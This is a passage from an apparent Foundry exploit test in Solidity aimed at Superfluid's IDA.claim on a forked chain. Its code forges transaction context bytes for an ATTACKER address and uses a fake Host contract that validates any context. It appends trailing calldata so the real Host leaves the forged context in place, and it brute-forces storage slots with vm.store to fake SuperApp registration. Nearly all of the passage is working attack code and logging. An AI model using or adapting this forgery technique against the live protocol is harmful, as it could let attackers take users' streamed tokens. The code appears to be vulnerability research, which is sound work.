            vm.revertTo(snapId);
        }

        // Test: callType=1, level=0, different appAddress values
        console.log("--- appAddress tests (callType=1, level=0, credit=MAX) ---");
        address[5] memory appAddrs = [address(0), ATTACKER, HOST, MATICx, IDA];
        string[5] memory addrLabels = ["appAddr=0x0", "appAddr=ATTACKER", "appAddr=HOST", "appAddr=MATICx", "appAddr=IDA"];

        for (uint256 i = 0; i < 5; i++) {
            uint256 snapId = vm.snapshot();
            ForgeryFakeHost fakeHost = new ForgeryFakeHost(IDA, MATICx);

            bytes memory ctx = CtxLib.encodeCtx(
                0, 1, block.timestamp, ATTACKER, IIDA.claim.selector, "",
                type(uint128).max, 0, 0, appAddrs[i], MATICx
            );

            uint256 subBefore = IMATICx(MATICx).balanceOf(address(sub));

            try fakeHost.claimWithForgedCtx(
                ATTACKER, TEST_INDEX + 300, address(sub), ctx
            ) {
                uint256 subAfter = IMATICx(MATICx).balanceOf(address(sub));
                console.log(addrLabels[i], "=> SUCCESS, sub delta:", subAfter - subBefore);
            } catch Error(string memory reason) {
                console.log(addrLabels[i], string.concat("=> REVERTED: ", reason));
            } catch {
                console.log(addrLabels[i], "=> REVERTED (raw)");
            }

            vm.revertTo(snapId);
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // Helpers
    // ═══════════════════════════════════════════════════════════════════

    function _tryClaim(
        string memory label,
        address publisher,
        address subscriber,
        uint32 indexId,
        uint8 appCallbackLevel,
        uint8 callType,
        address msgSender,
        uint256 appCreditGranted,
        int256 appCreditUsed,
        address appAddress,
        address appCreditToken
    ) internal {
        uint256 snapId = vm.snapshot();

        bytes memory forgedCtx = CtxLib.encodeCtx(
            appCallbackLevel,
            callType,
            block.timestamp,
            msgSender,
            IIDA.claim.selector,
            "",
            appCreditGranted,
            0,   // wantedDeprecated
            appCreditUsed,
            appAddress,
            appCreditToken
        );

        // Build calldata: claim(token, publisher, indexId, subscriber, forgedCtx)
        // Then append abi.encode(new bytes(0)) as trailing bytes so Host's
        // _callExternalWithReplacedCtx replaces the trailing placeholder
        // but the forged ctx is the 5th parameter (the actual `ctx` arg to claim)
        bytes memory innerCalldata = abi.encodeWithSelector(
            IIDA.claim.selector, MATICx, publisher, indexId, subscriber, forgedCtx
        );

        // The trailing bytes trick: Host sees calldata as claim(..., placeholder_ctx)
        // and replaces the placeholder at the end with the real ctx.
        // But if we put forgedCtx as the 5th param and a placeholder at the end,
        // Host replaces the trailing placeholder, leaving forgedCtx in place.
        bytes memory outerCalldata = abi.encodePacked(innerCalldata, abi.encode(new bytes(0)));

        uint256 subBalBefore = IMATICx(MATICx).balanceOf(subscriber);
        (int256 subRtBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(subscriber);

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, outerCalldata, "") {
            uint256 subBalAfter = IMATICx(MATICx).balanceOf(subscriber);
            (int256 subRtAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(subscriber);
            console.log(string.concat("  ", label, " => SUCCESS"));
            console.log("    sub balance delta:", int256(subBalAfter) - int256(subBalBefore));
            console.log("    sub realtime delta:", subRtAfter - subRtBefore);
        } catch Error(string memory reason) {
            console.log(string.concat("  ", label, " => REVERTED: ", reason));
        } catch (bytes memory rawErr) {
            console.log(string.concat("  ", label, " => REVERTED raw, len:"));
            console.log("    ", rawErr.length);
        }

        vm.revertTo(snapId);
    }

    function _registerAsSuperApp(address app) internal {
        // SuperApp registration: the Host stores app manifests in _appManifests mapping
        // We'll use vm.store to set it directly
        // The Host's _appManifests is at storage slot that we need to find
        // Or we can use the governance/factory registration

        // Method: use Host.registerAppByFactory
        // First check if there's a registered factory we can impersonate
        // Alternatively, directly manipulate storage

        // The app manifest is stored as:
        //   _appManifests[app] at mapping slot
        //   The mapping _appManifests is a mapping(ISuperApp => uint256)
        //   Need to find its slot

        // Let's try calling registerApp with appropriate configWord
        // configWord for: TYPE_APP_FINAL | BEFORE_AGREEMENT_UPDATED_NOOP disabled (to get callbacks)
        uint256 configWord = 1; // TYPE_APP_FINAL

        // Try having app register itself
        // ISuperfluid(HOST).registerApp(configWord) must be called by the app
        // But registerApp may require deployment in same tx or factory

        // Simpler: use vm.store to set the mapping
        // _appManifests slot: need to figure out. Let's try registerAppByFactory
        // where we impersonate a whitelisted factory

        // Actually, let's just use vm.etch to make the Host think it's a SuperApp
        // by directly storing in _appManifests

        // From Superfluid.sol storage layout:
        // The ISuperfluid contract likely inherits from upgradeable pattern
        // _appManifests is likely at a specific slot

        // Let's try a different approach: find a registered factory and impersonate it

        // Check if governance address can register apps
        // Or use vm.store directly

        // Superfluid contract storage (from source):
        // slot 0-100ish: various state vars
        // _appManifests is a mapping, likely at a specific slot

        // Let's just try prank as the app and call registerApp
        vm.prank(app);
        try ISuperfluid(HOST).callAgreement(IDA, "", "") {} catch {}

        // Direct storage approach: find _appManifests slot
        // In Superfluid.sol the storage layout has:
        //   AppManifest stored as uint256 configWord
        //   mapping(ISuperApp => uint256) _appManifests
        // We need the slot of this mapping

        // From the Superfluid source, _appManifests is declared around line 40-50
        // It's likely slot 5 or so after the proxy pattern slots

        // Let's try several possible slots
        _trySetAppManifest(app, 5);
        _trySetAppManifest(app, 6);
        _trySetAppManifest(app, 7);
        _trySetAppManifest(app, 8);
        _trySetAppManifest(app, 9);
        _trySetAppManifest(app, 10);
    }

    function _trySetAppManifest(address app, uint256 baseSlot) internal {
        // mapping(address => uint256) at baseSlot
        bytes32 slot = keccak256(abi.encode(app, baseSlot));
        // configWord = 1 (TYPE_APP_FINAL) with no noop bits set = callbacks enabled
        vm.store(HOST, slot, bytes32(uint256(1)));
    }

    function _registerAsSuperAppAlternate(address app) internal {
        // Try more slots (the proxy pattern may add offset)
        for (uint256 s = 11; s <= 30; s++) {
            _trySetAppManifest(app, s);
            (bool ok,,) = ISuperfluid(HOST).getAppManifest(app);
            if (ok) {
                console.log("SuperApp registered at slot:", s);
                return;
            }
        }

        // Try with EIP-1967 proxy offset
        // The proxy has its own storage, and the implementation storage starts after
        // In upgradeable proxies, storage is shared, so slots should be the same
        // Let's try higher slots
        for (uint256 s = 50; s <= 120; s++) {
            _trySetAppManifest(app, s);
            (bool ok,,) = ISuperfluid(HOST).getAppManifest(app);
            if (ok) {
                console.log("SuperApp registered at slot:", s);
                return;
            }
        }

        console.log("WARN: could not find _appManifests storage slot");
    }
}

// ── Simple receiver (non-SuperApp) ──────────────────────────────────────

contract SimpleReceiver {
    receive() external payable {}
}

// ── FakeHost for direct IDA.claim() with forged ctx ─────────────────────

contract ForgeryFakeHost {
    address public immutable ida;
    address public immutable superToken;

    // Callback observation logs
    bool public beforeCallbackCalled;
    bool public afterCallbackCalled;
    bytes public lastBeforeCtx;
    bytes public lastAfterCtx;

    constructor(address ida_, address superToken_) {
        ida = ida_;
        superToken = superToken_;
    }

    function claimWithForgedCtx(
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes memory forgedCtx
    ) external {
        IIDA(ida).claim(superToken, publisher, indexId, subscriber, forgedCtx);
    }

    // ── Host interface stubs ────────────────────────────────────────────

    function getAppManifest(address) external pure returns (bool, bool, uint256) {
        // Return: isSuperApp=true, isJailed=false, noopMask=0
        return (true, false, 0);
    }

    function isApp(address) external pure returns (bool) {
        return false;  // publisher is NOT a SuperApp in this FakeHost context
    }

    function isCtxValid(bytes calldata) external pure returns (bool) {
        return true;
    }

    function decodeCtx(bytes memory ctx)
        external
        pure
        returns (
            uint8 appCallbackLevel,
            uint8 callType,
            uint256 timestamp,
            address msgSender,
            bytes4 agreementSelector,
            bytes memory userData,
            uint256 appCreditGranted,
            uint256 appCreditWantedDeprecated,
            int256 appCreditUsed,
            address appAddress,
            address appCreditToken
        )
    {
        if (ctx.length > 0) {
            (
                appCallbackLevel,
                callType,
                timestamp,
                msgSender,
                agreementSelector,
                userData,
                appCreditGranted,
                appCreditUsed,
                appAddress,
                appCreditToken
            ) = CtxLib.decodeCtx(ctx);
        }
    }

    function appCallbackPush(
        bytes calldata ctx,
        address, /* app */
        uint256, /* appAllowanceGranted */
        int256, /* appAllowanceUsed */
        address  /* appAllowanceToken */
    ) external pure returns (bytes memory) {
        return ctx;
    }

    function appCallbackPop(bytes calldata ctx, int256) external pure returns (bytes memory) {
        return ctx;
    }

    function callAppBeforeCallback(
        address, /* app */
        bytes calldata, /* callData */
        bool, /* isTermination */
        bytes calldata ctx
    ) external returns (bytes memory) {
        beforeCallbackCalled = true;
        lastBeforeCtx = ctx;
        return "";
    }

    function callAppAfterCallback(
        address, /* app */
        bytes calldata, /* callData */
        bool, /* isTermination */
        bytes calldata ctx
    ) external returns (bytes memory) {
        afterCallbackCalled = true;
        lastAfterCtx = ctx;
        return ctx;
    }

    receive() external payable {}
}
